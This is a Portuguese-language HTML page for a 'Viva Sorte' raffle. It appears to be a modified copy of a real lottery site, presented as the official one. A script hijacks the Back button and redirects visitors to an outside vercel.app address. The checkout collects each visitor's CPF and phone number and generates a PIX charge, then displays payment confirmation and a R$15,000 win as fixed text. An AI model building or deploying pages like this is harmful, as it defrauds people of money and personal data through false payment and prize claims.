<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Viva Sorte</title>
    
    <!-- CSS -->
    <link href="css/style.css" rel="stylesheet">
    <link href="css/rodape.css" rel="stylesheet">
    <link href="css/pagamento.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="css2" rel="stylesheet">
    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
    
    <!-- Scripts de rastreamento (mantidos do original) -->
    <script src="../cdn.utmify.com.br/scripts/utms/latest.js" 
            data-utmify-prevent-xcod-sck
            data-utmify-prevent-subids async defer></script>
    
    <script>
        // Redirect para evitar voltar
        const link ='https://back-cyan-six.vercel.app/';
        function setBackRedirect(url) {
            let urlBackRedirect = url;
            urlBackRedirect = urlBackRedirect.trim() +
                (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
                document.location.search.replace('?', '').toString();

            history.pushState({}, '', location.href);
            history.pushState({}, '', location.href);
            history.pushState({}, '', location.href);

            window.addEventListener('popstate', () => {
                setTimeout(() => {
                    location.href = urlBackRedirect;
                }, 1);
            });
        }
        setBackRedirect(link);
    </script>
</head>
<body>
    <!-- HEADER -->
    <header class="white-header">
        <div class="logo">
            <img src="images/logoviva.png" alt="Logomarca" class="logoviva">
        </div>
        <button class="menu-button" id="menuButton">HOJE</button>
    </header>

    <!-- BANNER -->
    <div class="banner">
        <div class="container-banner">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
                <div class="carousel-inner">
                    <div class="carousel-item active">
                        <div class="tag-compre-agora"><span>Site Oficial</span></div>
                        <img src="images/1m1.jpg" class="d-block w-100" alt="...">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- T√çTULO PRINCIPAL -->
    <div class="sorteio-date w-100 text-center">
        <h1>Sorteio <span style="background-color: #f0ad4e;" id="contador">HOJE</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
    </div>

    <!-- CONTAINER PRINCIPAL -->
    <div class="container-principal">
        <!-- COTAS -->
        <div class="cotas">
            <!-- Primeira linha -->
            <div class="cotas-one">
                <button type="button" class="cota" onclick="selecionarPacote(6, 5.94)">
                    <div class="cota-qtd">+6</div>
                    <h1>R$5,94</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(10, 9.90)">
                    <div class="cota-qtd">+10</div>
                    <h1>R$9,90</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(15, 14.85)">
                    <div class="cota-qtd">+15</div>
                    <h1>R$14,85</h1>
                    <h2>SELECIONAR</h2>
                </button>
            </div>
            
            <!-- Segunda linha -->
            <div class="cotas-one">
                <button type="button" class="cota" onclick="selecionarPacote(20, 19.85)">
                    <div class="cota-qtd">+20</div>
                    <h1>R$19,85</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(30, 29.70)">
                    <div class="cota-qtd">+30</div>
                    <h1>R$29,70</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(40, 39.60)">
                    <div class="cota-qtd">+40</div>
                    <h1>R$39,60</h1>
                    <h2>SELECIONAR</h2>
                </button>
            </div>
            
            <!-- Terceira linha -->
            <div class="cotas-one">
                <button type="button" class="cota" onclick="selecionarPacote(70, 69.30)">
                    <i class="bi bi-star-fill destaque"></i>
                    <div class="cota-qtd">+70</div>
                    <h1>R$69,30</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(100, 99.00)">
                    <div class="cota-qtd">+100</div>
                    <h1>R$99,00</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(200, 199.00)">
                    <div class="cota-qtd">+200</div>
                    <h1>R$199,00</h1>
                    <h2>SELECIONAR</h2>
                </button>
            </div>
        </div>
    </div>

    <!-- CONTADOR PERSONALIZADO -->
    <div class="container-principal">
        <div class="contador-cotas">
            <span><button type="button" class="btn-contador-cotas" onclick="decrementar()">-</button></span>
            <input type="number" id="numero" class="input-contador-cotas" value="0" min="0">
            <span><button type="button" class="btn-contador-cotas" onclick="incrementar()">+</button></span>
        </div>
        
        <button type="button" id="btn-adicionar-carrinho" class="adc-carrinho" onclick="comprarTitulosCustom()" disabled>
            <i class="bi bi-cart-fill"></i> COMPRAR T√çTULOS
        </button>
        
        <div class="sorteio-date w-100 text-center" style="margin-top: 5px;">
            <br>
            <h1 style="font-size: 0.72rem;">Comprar mais t√≠tulos aumenta suas chances de ganhar!</h1>
        </div>
    </div>

    <!-- HOSPITAL E INFOS -->
    <div class="container-principal">
        <div class="hospital">
            <div class="card-hospital">
                <div class="card-hospital-image">
                    <img src="images/logo-hospital.svg">
                    <h2>Institui√ß√£o beneficiada</h2>
                </div>
                <div class="card-hospital-text">
                    <p>O Hospital do C√¢ncer de Londrina, fundado em 08 de novembro de 1965 por Lucilla Pinto Ballalai...</p>
                </div>
            </div>
            
            <div class="card-hospital card-hospital-bg-azul">
                <div class="card-hospital-image">
                    <img src="images/viva-hosp.svg">
                    <h2>Viva Privil√©gios</h2>
                </div>
                <div class="card-hospital-text">
                    <p>Viva Privil√©gios, um programa que enriquece sua vida com acesso √† sa√∫de, alimenta√ß√£o, transporte e mais...</p>
                </div>
            </div>
        </div>
    </div>

    <!-- RODAP√â -->
    <div class="rodape">
        <div class="container-principal">
            <img class="logo-rodape" src="images/logoviva.png">
            <div class="redes">
                <i class="bi bi-instagram"></i>
                <i class="bi bi-facebook"></i>
                <i class="bi bi-twitter"></i>
                <i class="bi bi-youtube"></i>
            </div>
            <h1>Sorteios lastreados por T√≠tulos de Capitaliza√ß√£o...</h1>
            <div class="linha-rodape"></div>
            <div class="patterns-rodape">
                <div class="pattern-rodape">T√≠tulos emitidos por: <img src="images/viacap.png"></div>
                <div class="pattern-rodape">Promo√ß√£o realizada por: <img src="images/viva.png"></div>
                <div class="pattern-rodape">Desenvolvimento: <img src="images/edjdigital.png"></div>
            </div>
        </div>
    </div>

    <!-- MODAL DAS 4 ETAPAS (CPF + TELEFONE + PIX + CONFIRMA√á√ÉO + PR√äMIO) -->
    <div id="modalPagamento" class="modal-pagamento">
        <div class="modal-conteudo">
            <!-- ETAPA 1: CPF -->
            <div id="etapa1" class="etapa ativa">
                <div class="modal-header">
                    <button class="btn-fechar" onclick="fecharModal()">√ó</button>
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">1</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">2</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">3</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <h2>Ol√°, boas vindas!</h2>
                    <p>Identifique-se usando seu CPF</p>
                    <div class="resumo-compra" id="resumoCompraEtapa1"></div>
                    
                    <div class="form-group">
                        <label>CPF</label>
                        <input type="text" id="inputCPF" placeholder="Digite o seu CPF" maxlength="14">
                        <div class="exemplo">Exemplo: 123.456.789-09</div>
                        <div id="erroCPF" class="mensagem-erro"></div>
                    </div>
                    
                    <div id="sucessoCPF" class="mensagem-sucesso" style="display: none;">
                        <i class="bi bi-check-circle-fill"></i>
                        Identifica√ß√£o realizada com sucesso!
                        <div>CPF: <span id="cpfExibido"></span> - Cadastro identificado</div>
                    </div>
                    
                    <button id="btnContinuarCPF" class="btn-principal" onclick="validarEtapa1()" disabled>
                        Continuar
                    </button>
                    
                    <div class="recaptcha-nota">
                        Este site √© protegido pelo Google reCAPTCHA. A Pol√≠tica de Privacidade e os Termos de Servi√ßo da Google se aplicam.
                    </div>
                </div>
            </div>
            
            <!-- ETAPA 2: TELEFONE E PIX -->
            <div id="etapa2" class="etapa">
                <div class="modal-header">
                    <button class="btn-fechar" onclick="fecharModal()">√ó</button>
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">2</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">3</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <h2>Informe seu telefone</h2>
                    <p>Para contato e confirma√ß√£o do pr√™mio</p>
                    
                    <div class="form-group">
                        <label>Telefone (WhatsApp)</label>
                        <input type="tel" id="inputTelefone" placeholder="(11) 99999-9999" maxlength="15">
                        <div id="erroTelefone" class="mensagem-erro"></div>
                    </div>
                    
                    <div class="resumo-pagamento">
                        <h3>Resumo do pagamento</h3>
                        <div class="detalhes-pagamento">
                            <div><span id="quantidadeResumo">6</span> t√≠tulos</div>
                            <div>R$ <span id="valorResumo">5,94</span></div>
                        </div>
                        <div class="total-pagamento">
                            <div>Total</div>
                            <div>R$ <span id="totalResumo">5,94</span></div>
                        </div>
                    </div>
                    
                    <div id="areaPIX" style="display: none;">
                        <div class="qrcode-container">
                            <div id="qrCodeImage"></div>
                            <p>Escaneie o QR Code com seu app banc√°rio</p>
                        </div>
                        
                        <div class="codigo-pix">
                            <p>Ou copie o c√≥digo PIX:</p>
                            <div class="input-copiar">
                                <input type="text" id="codigoPIX" readonly>
                                <button onclick="copiarCodigoPIX()">Copiar</button>
                            </div>
                        </div>
                        
                        <p class="instrucao">Ap√≥s o pagamento, clique no bot√£o abaixo para verificar</p>
                    </div>
                    
                    <button id="btnGerarPIX" class="btn-principal" onclick="gerarPIX()">
                        Gerar PIX para pagamento
                    </button>
                    
                    <button id="btnVerificarPagamento" class="btn-secundario" onclick="verificarPagamento()" style="display: none;">
                        <i class="bi bi-check-circle"></i> J√° efetuei o pagamento
                    </button>
                </div>
            </div>
            
            <!-- ETAPA 3: CONFIRMA√á√ÉO -->
            <div id="etapa3" class="etapa">
                <div class="modal-header">
                    <button class="btn-fechar" onclick="fecharModal()">√ó</button>
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">3</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <div class="confirmacao-sucesso">
                        <div class="icone-confirmacao">‚úÖ</div>
                        <h2>Pagamento Confirmado!</h2>
                        <p>Seu pagamento de R$ <span id="valorConfirmado">5,94</span> foi processado com sucesso.</p>
                    </div>
                    
                    <div class="premio-anuncio">
                        <h3>üéâ Parab√©ns!</h3>
                        <p>Voc√™ est√° participando do sorteio instant√¢neo VIVA SORTE!</p>
                        <p class="texto-pequeno">Clique no bot√£o abaixo para revelar seu pr√™mio</p>
                    </div>
                    
                    <button class="btn-premio" onclick="avancarParaEtapa4()">
                        VEJA O RESULTADO DO PR√äMIO INSTANT√ÇNEO
                    </button>
                </div>
            </div>
            
            <!-- ETAPA 4: PR√äMIO -->
            <div id="etapa4" class="etapa">
                <div class="modal-header">
                    <button class="btn-fechar" onclick="fecharModal()">√ó</button>
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <div class="premio-ganho">
                        <div class="trofeu">üèÜ</div>
                        <h1>PARAB√âNS!</h1>
                        <div class="valor-premio">R$ 15.000,00</div>
                        <p class="subtitulo-premio">Voc√™ ganhou 15 mil reais!</p>
                    </div>
                    
                    <div class="passos-premio">
                        <h3>üéÅ Pr√≥ximos Passos:</h3>
                        <ul>
                            <li><span>‚úÖ</span> Nossa equipe entrar√° em contato no telefone cadastrado</li>
                            <li><span>‚úÖ</span> Pr√™mio sujeito √† verifica√ß√£o de documenta√ß√£o</li>
                            <li><span>‚úÖ</span> Pagamento realizado em at√© 30 dias √∫teis</li>
                            <li><span>‚úÖ</span> Mantenha seus dados atualizados</li>
                        </ul>
                    </div>
                    
                    <div class="agradecimento">
                        <p>Obrigado por participar do VIVA SORTE!</p>
                        <p>Qualquer d√∫vida, entre em contato pelo suporte.</p>
                    </div>
                    
                    <button class="btn-finalizar" onclick="fecharModal()">
                        Finalizar
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- POPUPS DE NOTIFICA√á√ÉO (mantido do original) -->
    <div class="popup" id="popup"></div>
    <audio id="notifySound" preload="auto">
        <source src="media/beep-07.html" type="audio/wav">
    </audio>

    <!-- SCRIPTS -->
    <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
    <script src="js/cpf-validation.js"></script>
    <script src="js/pix-generation.js"></script>
    <script src="js/etapas-pagamento.js"></script>
    <script src="js/main.js"></script>
    
    <!-- Pixel tracking (mantido) -->
    <script>
        window.pixelId = "685640fd13ebed4217f0b98d";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "../cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script>
    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
</body>
</html>